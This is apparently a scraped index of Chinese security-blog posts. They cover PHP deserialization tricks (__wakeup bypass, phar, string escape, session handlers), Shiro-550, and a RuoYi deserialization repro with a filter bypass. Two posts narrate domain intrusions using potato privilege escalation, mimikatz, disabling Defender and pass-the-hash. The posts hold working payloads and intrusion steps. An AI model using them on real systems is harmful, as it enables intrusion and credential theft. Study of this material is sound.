123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151&lt;?phpclass Test{ public $public; protected $protected; private $private; function __construct() { echo \"construct\"; echo \"&lt;br&gt;\"; } function __toString() { echo \"toString\"; echo \"&lt;br&gt;\"; return \"\"; } function __call($name,$args) { echo \"call\"; echo \"&lt;br&gt;\"; } static function __callStatic($name,$args) { echo \"callStatic\"; echo \"&lt;br&gt;\"; } function __get($name) { echo \"get\"; echo \"&lt;br&gt;\"; } function __set($name,$value) { echo \"set\"; echo \"&lt;br&gt;\"; } function __isset($name) { echo \"isset\"; echo \"&lt;br&gt;\"; } function __unset($name) { echo \"unset\"; echo \"&lt;br&gt;\"; } function __invoke() { echo \"invoke\"; echo \"&lt;br&gt;\"; } static function __set_status($arr) { echo \"set_status\"; echo \"&lt;br&gt;\"; } function __clone() { echo \"clone\"; echo \"&lt;br&gt;\"; } function __debugInfo() { echo \"debugInfo\"; echo \"&lt;br&gt;\"; return null; } public function __serialize(): array { echo \"serialize\"; echo \"&lt;br&gt;\"; return [ 'public' =&gt; $this-&gt;public, 'protected' =&gt; $this-&gt;protected, 'private' =&gt; $this-&gt;private, ]; } function __unserialize(array $data): void { echo \"unserialize\"; echo \"&lt;br&gt;\"; } function __sleep() { echo \"sleep\"; echo \"&lt;br&gt;\"; return array('public', 'protected', 'private'); } function __wakeup() { echo \"wakeup\"; echo \"&lt;br&gt;\"; } function __destruct() { echo \"destruct\"; echo \"&lt;br&gt;\"; }}// construct$test = new Test();// toStringecho $test;// call$test-&gt;fun();// callStaticTest::fun();// getecho $test-&gt;private;// set$test-&gt;private = \"private\";// issetisset($test-&gt;private);// unsetunset($test-&gt;private);// invoke$test();// set_statuseval(var_export($test,true).\";\");// clone$test1 = clone $test;// debugInfovar_dump($test);echo \"&lt;br&gt;\";// serialize$ser = serialize($test);// unserialize$unser = unserialize($ser);unset($test);unset($test1); 顺便说下，__serialize和__unserialize这两个特性在php7.4以后才有效。 PHP反序列化特性__wakeup绕过__wakeup绕过利用的不是php的某个特性，而是一个有CVE编号的漏洞，不过在我看来只是个bug，不知道为什么能分到CVE编号。受影响的版本为PHP5的5.6.25以下和PHP7的7.0.10以下。漏洞的利用很简单：当序列化字符串中描述对象属性个数的数字比实际的属性个数大，则反序列化时__wakeup方法则不执行。 利用场景嘛，就是以下这种__wakeup方法有替换或者过滤的情况。 123456789101112131415&lt;?phpclass Weakup{ var $command; function __wakeup(){ $this-&gt;command = \"phpinfo();\"; } function __destruct(){ @eval($this-&gt;command); }}$obj = unserialize($_GET['obj']); 以上payload中，序列化字符串描述属性有两个，但实际只有一个，绕过了__wakeup，command参数没有被替换为phpinfo，执行了我们的dir命令。 phar反序列化直接的php反序列化使用的是unserialize这个函数，但很多时候不一定会有这个函数，这个可以利用phar实现反序列化。phar是php的归档文件，phar中有一处存储序列化后的mate-data信息，通过phar://伪协议，配合某些文件函数就可以进行php反序列化。 生成Phar归档文件的代码如下，从seebug上CV下来的，setMetadata方法的参数就是需要序列化的对象。 1234567891011121314&lt;?php class TestObject { } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 第一次运行可能会报phar无法生成的问题，按照报错信息在配置文件中把phar.readonly关闭即可。 打开生成的phar归档文件，在里面可以看到序列化后的TestObject对象。 然后就可以使用文件函数配合phar:\\\\伪协议，进行php反序列化。可用的文件函数如下，也是用的seebug的图。 写个Demo测试下： 1234567891011121314151617181920212223&lt;?phpclass TestObject{ var $command; function __wakeup() { @eval($this-&gt;command); }}@unlink(\"phar.phar\");$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");$o = new TestObject();$o-&gt;command = \"phpinfo();\";$phar-&gt;setMetadata($o);$phar-&gt;addFromString(\"test.txt\", \"test\");$phar-&gt;stopBuffering();file_get_contents(\"phar://phar.phar/test.txt\");?&gt; 顺便说下，我用php8测试phar:\\\\伪协议的时候发现它不会进行反序列化了。网上查了下，P神的文章里说php8里的Phar中的元信息不再自动进行反序列化了。 关于phar反序列化还有两个trick，当代码中有过滤，传入的文件名不能以phar://开头，但在前面加上compress.zlib://还是能反序列化；phar归档文件的stub标志只需__HALT_COMPILER(); ?&gt;，前面可加上任何内容，可以绕过文件头检测的文件上传。 字符串逃逸在php中是靠描述的长度来识别字符串变量开始与结束，以分号;来分隔，以花括号}来代表对象或数组的结束，所以像下列代码一样，字符串变量中的双引号花括号或序列化字符串后加上点内容也丝毫不影响反序列化。 123456789101112&lt;?phpclass Test{ var $test;}$unser1 = 'O:4:\"Test\":1:{s:4:\"test\";s:12:\"testtest\"}}}\";}';$unser2 = 'O:4:\"Test\":1:{s:4:\"test\";s:12:\"testtesttest\";}\"\"\"\"}}}}';var_dump(unserialize($unser1));echo \"&lt;br&gt;\";var_dump(unserialize($unser2)); 因为这种特性，如果在序列化后对序列化字符串进行过滤或替换，使得替换前后的长度发生变化，一边情况下会导致反序列化出错，在加以利用可造成字符串的逃逸，修改其他参数的值。 根据替换前后的长度变化，可将情况跟为两种：替换后长度变长、替换后长度变短，以下分别分析这两种情况。 替换后长度变长12345678910111213141516171819&lt;?phpclass Test{ var $test; var $command; function __wakeup() { @eval($this-&gt;command); }}$test = new Test();$test-&gt;command = \"phpinfo();\";$test-&gt;test = $_GET[\"test\"];$ser = serialize($test);$ser = str_replace(\"z\", \"zz\", $ser);var_dump(unserialize($ser)); 这个Demo的目的是要把commond属性替换为我们的命令，需要逃逸的字符串为&quot;;s:7:&quot;command&quot;;s:14:&quot;system('dir');&quot;;}，替换前后的长度变化为由1变2，那令z的长度等于需要逃逸的字符串的长度即可，最终payload为： 1zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&apos;dir&apos;);&quot;;} 替换后长度变短123456789101112131415161718192021&lt;?phpclass Test{ var $test1; var $test2; var $command; function __wakeup() { @eval($this-&gt;command); }}$test = new Test();$test-&gt;command = \"phpinfo();\";$test-&gt;test1 = $_GET[\"test1\"];$test-&gt;test2 = $_GET[\"test2\"];$ser = serialize($test);$ser = str_replace(\"ab\", \"\", $ser);var_dump(unserialize($ser)); 替换后长度由长变短，似乎需要至少两个属性可控才能逃逸字符串。第一个属性用于减少减短长度，第二字符串用于逃逸字符串，需要减少的长度为第一个属性的内容到第二个属性需要逃逸的字符串之间的距离。最终payload为以下内容。需要注意的是，长度减短后，test2属性就被吞掉了，逃逸时需要加一个属性使得属性数量为3，才能正常反序列化。由于php不存在的属性也能被反序列化的特殊，这里随便加个属性即可。 1test1=abababababababababab&amp;test2=&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&apos;dir&apos;);&quot;;i:1;s:1:&quot;a&quot;;} session反序列化php中的session一般以文件形式存储，存储的格式又为序列化格式。php的session序列化处理器有三种，分别为php、php_serialize和php_binary，通过php.ini中的session.serialize_handler设置，默认为php。 php序列化处理器 12345&lt;?phpini_set('session.serialize_handler','php');session_start();$_SESSION[\"test\"]=\"session\"; session的格式为：键加上分隔符|加上序列化内容。 php_serialize序列化控制器 12345&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION[\"test\"]=\"session\"; session的格式为：$_SESSION这个数组的序列化内容。 php_binary序列化处理器 12345&lt;?phpini_set('session.serialize_handler','php_binary');session_start();$_SESSION[\"test\"]=\"session\"; session的格式为：一个字节记录键的长度，然后拼上键，再拼上序列化内容。这里键test的长度为4，所以记录的键长度的字节为04。 当程序员混用序列化控制器时，由于session内容的解析方式不同，再精心构造下可造成反序列化漏洞。网上的文章大都是php_serialize保存session，php读取session这种方式造成反序列化漏洞的，这里就先探讨这种方式。 php_serialize转php123456// php_serialize.php&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();$_SESSION[\"test\"] = $_GET[\"test\"]; 12345678910111213141516// php.php&lt;?phpini_set('session.serialize_handler','php');session_start();class Test{ var $command; function __wakeup() { @eval($this-&gt;command); }} 当test传入的内容为|O:4:&quot;Test&quot;:1:{s:7:&quot;command&quot;;s:10:&quot;phpinfo();&quot;;}，保存session时，php_serialize直接序列化$_SESSION数组；读取session时，由php解析，由于有一个分隔符|，分隔符前的内容被当成键，分隔符后的内容被当成序列化内容，并会被自动的反序列化，然后自动调用魔术方法__wakeup，执行了phpinfo。 php_binary转phppayload与php_serialize转php的通用，这里就不细说了。 php_binary转php_serializephp_serialize序列化处理器要能反序列化，php_binary相应的就需要以a开头，所以键长度要为116。总的来说，这种情况反序列化漏洞，需要session的键可控才可实现了。 最后的poc是这样，后面一串a用来填充长度到116： 1234&lt;?phpini_set('session.serialize_handler', 'php_binary');session_start();$_SESSION[':1:{s:1:\"a\";O:4:\"Test\":1:{s:7:\"command\";s:10:\"phpinfo();\";};}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'] = \"a\"; php_serialize转php_binaryphp_serialize处理器开头总是a，转到php_binary解析键长度需要为116，所以填充需要放在开头，加上其他的序列化内容的长度要为116。因为Demo里只有一个键值对，所以payload的构造简单点，如果存在其他的键值对，构造就里会复杂点，甚至没法构造。 1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaO:4:&quot;Test&quot;:1:{s:7:&quot;command&quot;;s:10:&quot;phpinfo();&quot;;} 以上payload在php_serialize序列化处理器下生成的session，在php_binary里的解析方式如下： session反序列化小结其他组合的session反序列化跟以上几个也大同小异，总的来说，主要围绕着首字节和分隔符|构造payload。除了转php的，也就是分隔符造成的反序列化漏洞外，其他组合的session反序列化，需要键名可控、session内容已知、可控键值对在session中靠前等条件，利用难度还是挺高的。 后记PHP反序列化浅析终于写完了，时间比我预期的要久。水文章也是不能偷懒滴，希望后面的学习提高下效率吧，下一站，向Java反序列化进发！ 参考https://www.php.net/manual/en/language.oop5.magic.php https://paper.seebug.org/680/ https://www.leavesongs.com/PHP/php-8-0-release.html https://blog.csdn.net/qq_45521281/article/details/107135706","link":"/2021/07/30/php反序列化浅析/"},{"title":"基于ASP.NET MVC的easycms的easy代码审计","text":" 您好, 这里需要密码.","link":"/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/"},{"title":"没什么好分析的Shiro-550","text":"前言陆陆续续分析了几个Java的安全漏洞，接下来轮到shiro的了。这里分析的是Shiro-550，硬编码rememberMe密钥造成的反序列化漏洞。分析起来比想象着的简单。 环境搭建Shiro-550是使用shiro1.2.4及以下的默认密钥导致的反序列化漏洞，环境的代码我是用的github上一个大佬写的，使用的是Maven包管理，不用怎么搭，自动下载依赖直接运行即可。 漏洞调试根据网上大部分的复现文章，使用ysoserial生成CommonsBeanutils1反序列化链的payload，并使用上面shiro漏洞环境项目的GenPayload类加密一下payload，生成shiro可识别的rememberMe内容。 然后依旧是在Runtime的exec方法下断点，Cookie中设置rememberMe并发送。调用栈挺长的，但跟rememberMe有关的是从AbstractRememberMeManager开始这段。 跟进到AbstractRememberMeManager的getRememberedPrincipals方法。看到bytes变量的内容为加密后的序列化链，跟进getRememberedSerializedIdentity方法看看是如何获取rememberMe内容的。 getRememberedSerializedIdentity方法在AbstractRememberMeManager类中是抽象方法，具体的实现代码要去到AbstractRememberMeManager的子类CookieRememberMeManager中看。整体就是从Cookie中获取rememberMe内容，并返回base64解码的内容。rememberMe的内容是通过this.getCookie()获取当前的cookie对象，而cookie初始化时是用rememberMe这个名称的，获取到的内容相应的也该名称的值。 1234567891011121314151617181920212223242526protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { if (!WebUtils.isHttp(subjectContext)) { ... return null; } else { WebSubjectContext wsc = (WebSubjectContext)subjectContext; if (this.isIdentityRemoved(wsc)) { return null; } else { HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = this.getCookie().readValue(request, response); if (\"deleteMe\".equals(base64)) { return null; } else if (base64 != null) { base64 = this.ensurePadding(base64); ... byte[] decoded = Base64.decode(base64); ... return decoded; } else { return null; } } }} 获取到字节数组为非空的话会继续调用convertBytesToPrincipals方法，在convertBytesToPrincipals方法中先调用decrypt方法对rememberMe进行解密。shiro使用的是AES加密，按理说还具有初始化向量iv，但解密时候的iv是从rememberMe的开头获取的，所以不影响payload的构造。 1234567891011121314151617181920public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException { byte[] encrypted = ciphertext; byte[] iv = null; if (this.isGenerateInitializationVectors(false)) { try { int ivSize = this.getInitializationVectorSize(); int ivByteSize = ivSize / 8; iv = new byte[ivByteSize]; System.arraycopy(ciphertext, 0, iv, 0, ivByteSize); int encryptedSize = ciphertext.length - ivByteSize; encrypted = new byte[encryptedSize]; System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize); } catch (Exception var8) { String msg = \"Unable to correctly extract the Initialization Vector or ciphertext.\"; throw new CryptoException(msg, var8); } } return this.decrypt(encrypted, key, iv);} 接着是对解密后的内容进行反序列化，最终调用方的是DefaultSerializer类的deserialize方法。这里实例化ObjectInputStream类是用他的子类ClassResolvingObjectInputStream是实现的。 ClassResolvingObjectInputStream的resolveClass方法是通过forName方法返回Class实例的，但forName不支持数组类型的Class，所以反序列化的利用链没使用CommonsCollections的，而是用了CommonsBeanutils1。因为事先看了别的师傅复现的文章，所以没有踩这个坑。具体的forName原理在@zsx师傅的文章里有详尽的分析。除此之外，后面的反序列化就与普通的反序列化无异。 后记CommonsBeanutils1里的TemplatesImpl在上回Java反序列化的文章里没有学到，好像fastjson不出网的payload是有用到这个的，后续还还要补充学习。冲冲冲 参考https://www.cnblogs.com/loong-hon/p/10619616.html https://p2hm1n.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ https://www.mi1k7ea.com/2020/10/03/%E6%B5%85%E6%9E%90Shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88Shiro550%EF%BC%89/#%E9%83%A8%E5%88%86Gadget%E6%89%93%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%9D%91 http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/#4-%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F https://blog.zsxsoft.com/post/35","link":"/2021/09/14/没什么好分析的Shiro-550/"},{"title":"用不可描述的软件做HTB的前置代理","text":"前言​前段时间打HTB，一直受到速度慢的困扰，有时等待一些静态资源加载都要好久。由于一些众所周知的原因，而且HTB提供的代理是OpenVpn，更是被重点关注，于是摸索出来给HTB的OpenVpn加个前置代理的方法，可以加快点速度。 准备工作 不可描述软件酸酸乳和账号一个（我用的酸酸乳，用V2什么的应该也是可以的吧） 右键酸酸乳的运行图标，点击端口设置。像下图一样，添加一个端口设置。开关打开、类型选端口转发，目标地址用的HTB节点的域名，按实际情况填，本地端口随意。 修改配置文件按照官网上的指引修改协议为tcp（酸酸乳默认只支持tcp）。 修改udp协议为tcp、修改remote的端口为端口转发的本地监听端口、服务器地址改为端口转发监听的网卡ip地址、修改&lt;tls-auth&gt;标签为&lt;tls-crypt&gt;。 修改好并保存，启动openvpn应该就能正常运行了，虽然还是很慢，但静态文件至少还能加载，还是充钱才能变得更强啊。","link":"/2020/10/05/用不可描述的软件做HTB的前置代理/"},{"title":"第二次梦里的后渗透","text":"前言继上次做了一个后渗透的梦之后，最近又做了一个同样是后渗透的梦，后面就是都是一些基础操作、没什么干货的水文，在梦里还是这么菜。。。呜~呜~呜~ 信息收集先收集域内信息，存在域，域控和域管理员各两个。 123net time /domainnet group \"domain controllers\" /domainnet group \"domain admins\" /domain 在收集下网络、补丁和权限的信息。 123ipconfig /allsysteminfowhoami /priv 刚好其中一台域控主机就是当前这台机子，补丁打得比较勤，又是开启了SeImpersonateProvilege，Potato系列提权即可。 提取查看进程发现了WinDefend，找了个免杀的BadPotato才提了权。 1tasklist /svc | findstr WinDefend 用BadPotato运行了CS的免杀后门上了线，顺便派生到了msf里。mimikatz读了一波密码，由于系统是Windows2012，所以没有读到明文密码。 接着又用Lazagne.exe读了一波密码，但是除了NTLM之外并没有读到其他的密码。 横向移动虽然做了静态免杀，但是微软的动态查杀挺强的，对外扫描不一会就给WinDefend杀了，给横向移动造成了不少困扰。但不会拦截添加用户和添加用户到Administrators组，而且上面有开了远程桌面，可以直接远程桌面连上去，把WinDefend给鲨了。 后面常规的创建用户加入到Administrators组，CS开启socks代理，但连接远程桌面时候遇到NLA认证问题，查询到freerdp支持NLA，用freerdp解决。 虽然远程桌面进了去，但是WinDefend通常只有启动这个服务的用户才能停止，一般是system用户，奇怪的是用BadPotato执行停止服务的命令还是没法关闭，好在在superuser上找到了个关闭WinDefend的方法。 打开gpedit.msc，切换到Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows Defender，Turn off Windows Defender设置为Enable。 虽然是没抓到明文密码，但是有NTLM，可用利用Pass The Hash横向移动。由于CS的横向移动是直接传后门的，后面知道域内主机全都有杀软，打完之后全都没上线。 所以上传了个Invoke-TheHash来PTH，大部分主机都能执行命令。 用powershell下载CS的免杀后门并执行，成功让域内主机都上了线。 后续的横向移动在上线的主机上收集到一堆txt和web.config里的密码，对1433、ssh和RDP等服务进行爆破，可惜并没有爆破得到。扫了一遍内网web服务，都是些网络设备，还有一个开源的后台，弱口令进了其中一个，但是没什么收货。 后记总结下这次的渗透流程： getshell-&gt;域信息收集-&gt;提权-&gt;获取NTLM-&gt;关闭WinDefend-&gt;PTH横移动","link":"/2020/09/11/第二次梦里的后渗透/"},{"title":"若依反序列漏洞复现及其修复绕过","text":"前言学完了Java反序列化，在CNVD上找了个有Java反序列化漏洞的系统练练手，叫若依后台管理系统，在github上的star数也不少。我是挺喜欢这个名字的，你若不离不弃、我必生死相依，这个寓意可是作者的官方解读，不是我瞎编的。😆 信息收集主要是看看有没有代码审计的文章，搜了下发现有一篇简单审计这个反序列化漏洞的文章，在官网上还十分良心的给出了历史漏洞。在历史漏洞里给出了Poc和修复方案。 可以初步得知漏洞出现在定时任务的SysJobController控制器里，三个POC的前两个是JNDI注入，后一个是yaml反序列化。 漏洞复现漏洞复现这里使用yaml反序列化的payload来复现。在github上下载yaml-payload并编译打包成jar包，并使用python的SimpleHTTPServer模块起一个HTTP服务用来下载恶意jar包。然后，在后台系统监控的定时任务里加上以下一条任务。 1org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]]]]&apos;) 然后，IDEA里在Runtime的exec方法下个断点，并在相应定时任务的更多操作里执行一次任务。在调用栈里可看到，项目里的方法调用有四个，其他两块的调用栈分别是quartz任务调度框架和snakeyaml的栈。 跟进AbstractQuartzJob的execute方法，这个方法是由quartz任务调度框架调用的，由quartz的文档可知每个实现Job接口的类为一个任务，这个类还需重写execute方法来实现任务的执行内容。在这个execute方法里，它实例化了一个SysJob类，并调用了doExecute方法。调用的doExecute方法是子类QuartzDisallowConcurrentExecution，功能只是再继续调用JobInvokeUtil的invokeMethod静态方法。 继续跟进到invokeMethod方法，才有一些实质性的逻辑代码。开头调用目标、类名、方法名和方法参数。 123456789101112131415161718public static void invokeMethod(SysJob sysJob) throws Exception{ String invokeTarget = sysJob.getInvokeTarget(); String beanName = getBeanName(invokeTarget); String methodName = getMethodName(invokeTarget); List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget); if (!isValidClassName(beanName)) { Object bean = SpringUtils.getBean(beanName); invokeMethod(bean, methodName, methodParams); } else { Object bean = Class.forName(beanName).newInstance(); invokeMethod(bean, methodName, methodParams); }} 需要注意的是获取方法参数这里，只能获取String、boolen、long、double和int类型的参数。 1234567891011121314151617181920212223242526272829303132public static List&lt;Object[]&gt; getMethodParams(String invokeTarget){ String methodStr = StringUtils.substringBetween(invokeTarget, \"(\", \")\"); if (StringUtils.isEmpty(methodStr)) { return null; } String[] methodParams = methodStr.split(\",\"); List&lt;Object[]&gt; classs = new LinkedList&lt;&gt;(); for (int i = 0; i &lt; methodParams.length; i++) { String str = StringUtils.trimToEmpty(methodParams[i]); // String字符串类型，包含' if (StringUtils.contains(str, \"'\")) { classs.add(new Object[] { StringUtils.replace(str, \"'\", \"\"), String.class }); } // boolean布尔类型，等于true或者false else if (StringUtils.equals(str, \"true\") || StringUtils.equalsIgnoreCase(str, \"false\")) ... // long长整形，包含L else if (StringUtils.containsIgnoreCase(str, \"L\")) ... // double浮点类型，包含D else if (StringUtils.containsIgnoreCase(str, \"D\")) ... // 其他类型归类为整形 else ... } return classs;} 后续正常类名会进入else代码体，通过newInstance方法获得传入类名的无参构造方法实例化的对象，然后使用对象、方法名和方法参数调用另一个重载的invokeMethod方法。这个重载的invokeMethod方法就是实现反射调用方法的功能，这里就是不细说了。至于POC中JNDI注入，上一篇文章有分析，这里也不细说了，而yaml怎么实现的反序列化，本文也不展开，在后续的文章中再仔细分析。 通过以上的调用栈的分析，可得出以下构造若依反序列化漏洞payload的条件： 入口类只可进行一次反射调用 入口类需可被实例化，并具有默认的无参构造方法 调用的类方法需为无参或参数为String、boolen、long、double和int几种类型 过滤不严回到官网，作者给出的修复方案是过滤rmi、ldap、http字符串，对应的是作者给出的三个POC。那还有其他协议可以实现反序列化吗？答案是肯定的， 虽然官方文档好像没有给出URL类支持的协议，但可以使用以下验证支持那种协议。 12345678910111213141516public static void main(String[] args) { String host = \"www.baidu.com\"; String file = \"/index.html\"; String[] schames = {\"http\", \"https\", \"ftp\", \"mailto\", \"telnet\", \"file\", \"ldap\", \"gopher\", \"jdbc\", \"rmi\", \"jndi\", \"jar\", \"doc\", \"netdoc\", \"nfs\", \"verbatim\", \"finger\", \"daytime\", \"systemresource\", \"webService\", \"redis\", \"zookeeper\", \"rest\", \"thrift\", \"dubbo\"}; for (int i = 0; i &lt; schames.length; i++) { try { URL url = new URL(schames[i], host, file); System.out.println(\"滋瓷 \" + schames[i] + \" 协议\"); } catch (MalformedURLException e) { System.out.println(\"不滋瓷 \" + schames[i] + \" 协议\"); } }} 在测试结果中一眼就能看到file协议和ftp协议，还有个jar协议也是可以使用的，但还是需要借助其他协议才能下载jar包，就没必要多此一举了。 ftp协议的漏洞利用和http协议的其实差不多，把POC中的协议改一改，ftp服务可以使用python的pyftpdlib模块搭一个。 file协议的利用需要把jar包上传到网站上，通知公告模块的编辑器可以上传文件，虽然有文件后缀的白名单过滤，但并不影响URL类加载jar包。不过上传文件返回的路径并不是网站上物理路径，在spring的配置文件application.yml中可以看到windows的默认路径为D:/ruoyi/uploadPath，linux的默认路径为/home/ruoyi/uploadPath。 所以物理路径是D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt，最后的payload如下。 1org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file:/D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&quot;]]]]&apos;) 一些其他尝试除了过滤不严，还想到了两种构造payload的方法，分别为从依赖包和项目中寻找合适的类和方法。由于系统框架是Spring的，一开始想到的是用SpEL表达式来实现命令执行，但是后面试了下才知道parseExpression方法生成表达式对象后，这个对象还得调用getValue方法才会解析这个表达式。后面陆陆续续看了些质料，发现EL表达式似乎符合这个系统的场景。简单的介绍下EL表达式，他是一种可在JSP和JSPX中使用的语言，可在脚本中获取参数、执行运算、获取对象和调用函数等。 在Java代码中可以使用ELProcessor对象的eval解析EL表达式，经过简单构造可得出payload如下： 1javax.el.ELProcessor.eval(&apos;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[\\&apos;(java.lang.String[])\\&apos;]([\\&apos;cmd\\&apos;,\\&apos;/c\\&apos;,\\&apos;calc\\&apos;]).start()&quot;)&apos;) 然而一跑起来就抛出了ELException异常，调试跟到反射调用的地方发现EL表达式只剩下&quot;&quot;.getClass(。 最后回去找，大意了。在StringUtils工具类的substringBetween方法，也就是他获取参数的方法中发现它匹配的右括号是传入payload中的第一个，也就是payload中调用的方法不能出现左括号，否则无法获取到所有的参数。 除了依赖包中的类，还找了一圈项目中的类，发现一个yaml的工具类YamlUtil的loadYaml方法可能合适，于是又简单的构造了个payload： 1com.ruoyi.common.utils.YamlUtil.loadYaml(&apos;D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&apos;) 这次则是抛出了FileNotFoundException，因为getResourceAsStream方法无法获取ClassPath外的文件，实在是学艺不精。 后续在项目中还发现了另一个可利用的点，FileUtils工具类的deleteFile方法可以实现任意文件删除，但本文的目标是getshell，而且利用方法也很简单，这里就不再具述。 修复建议借着漏洞条例的颁布，这里献上本人的修复建议。其实在我上一个审计的系统中也是有定时任务功能的，也是通过反射的方式调用任务的实现代码，但是用户只能传入实现这个方法的类名，系统实例化这个类并调用特定的方法。 在这个系统中当然可以使用黑白名单的方式对可实例化的类进行过滤，但这样似乎修复得不彻底。如果使用调用特定方法的方式执行任务，只需设置一个比较特殊的方法名，这个漏洞就很难利用起来了，实际上这个系统用到的quartz任务调度框架就是使用类似的方式，作为调度任务的类续实现quartz的Job接口，并重写execute方法。 当然，以上只是个人对这个漏洞修复的小小看法，仅供参考。 后记本来想找到更高大上的payload，最后还只是找到过滤不严的问题，总的来说还是学艺不精。不过了解到各种表达式还是颇有收获，最后各位师傅若想到其他payload，望不吝赐教。 参考https://www.cnblogs.com/r00tuser/p/14693462.html https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E https://blog.csdn.net/weixin_41725792/article/details/109818161 https://zhuanlan.zhihu.com/p/183902092","link":"/2021/09/04/若依反序列漏洞复现及其修复绕过/"},{"title":"记一次梦里的后渗透","text":"前言前几天晚上做了一个梦，梦里做了一次后渗透，梦到我拿下域控，今天觉得应该记录下来。 本文纯属虚构，如有雷同纯属巧合。 信息收集起手一个webshell，运气比较好，tasklist没有杀软，上传一个cs后门方便执行命令。 先看看用户和补丁情况，发现发现是个低权限用户nt authority\\network service，Windows2008R2补丁也打得挺勤快的。 12whoamiwmic qfe get Caption,Description,HotFixID,InstalledOn ipconfig看到存在两张内网网卡。 查找域控，定位到两台。 12net group \"domain controllers\" /domainping XXX 配置文件、txt之类的文件都收集了一遍，没找到敏感信息。 提权虽然补丁打得挺勤快的，但是用twitter大佬的提权检测脚本，用自带命令就是whoami /priv，发现一处特权滥用：SeImpersonatePrivilege。根据三好学生师傅的文章得知可用JuicePotato提权。 用多汁土豆运行我们的后门，过会就能在sc里看见上线了一台system权限的机器。 1JuicyPotato -l 1337 -p \\path\\to\\cs.exe -t * 又是运气爆棚的时候，查到本机保存了域控密码，而且是win2008，用mimikatz读一波明文密码。 横向移动既然有了域名管理员密码，就可以用msf的smb_login和psexec进行横向移动，但我这里用cs的psexec，能直接上线主机。 右键session点击net view获取target，在target view选中所有target，右键login->psexec，选中读到的明文密码、选中一个listener、选中一个session，开扫！ 过了半个小时，存活的机子几乎都上了线。 再转到msf，用MS17-010扫扫。发现都内网补丁都整挺好的，一个都没扫到。内网还有几台linux的机子，但是不想继续搞了，擦擦屁股，报告给厂商。（跑 后记如梦初醒，原来我并没有搞什么后渗透，也没拿什么域控，我还是这样的菜，还是无业游民一个，一切都是梦。 过几天又有ctf打了，得重新拿起pwn，做个pwn弟弟了。","link":"/2020/08/10/记一次梦里的后渗透/"},{"title":"[逆向学习笔记]上海全国大学生网络安全邀请赛-pluzz","text":"0x00前言 这回上海大学生网络安全邀请赛就看了这题，实在是没空。不过这次我作为跑龙套的re手思路最清晰的一回了，值得记录下来。 0x01思路作为汇编基础不扎实的跑龙套re手，拿到题目当然是仍经IDA来F5一波。 main函数的逻辑很简单，if判断为真就在sub_401BA0输出flag。通过OD动调得知v11就是通过输入的v9作为种子什么的，经过sub_401BA0函数获得uuid。 if里第一个函数简单的判断输入长度是否为16位，然后是一个while循环，我一开始navie的认为只能输入a-f的字符，后来才发现输入1-9的时候类型转无符号型，结果也会比&amp;大，以后遇到类型转换一点要注意了。 第二个函数没看懂是什么操作，但谷歌了一下%02X格式化输出位两位16的意思，动调的结果也确实如此。值得注意的是sub_401B60的两参数是传引用进去的，在执行完这个函数之后第一个参数的值发生了改变，所以一个函数除了看返回值外还要看它的参数是否为指针或者引用。太菜了现在才领悟到这个道理。 第三个函数IDA的伪代码也没看懂是什么操作，好在这个函数在这之前与输入的字符串关。第一个参数为取指针，直接动调一下看结果，出来了一串好像是int型的东西，后一个函数会用到先dump下来。 第四个函数这回看懂了，就是将转换后的16进制与上一个函数的结果的第i位和前i位的和进行异或，先把要异或的数dump下来备用。返回值恒为真，先放一边。 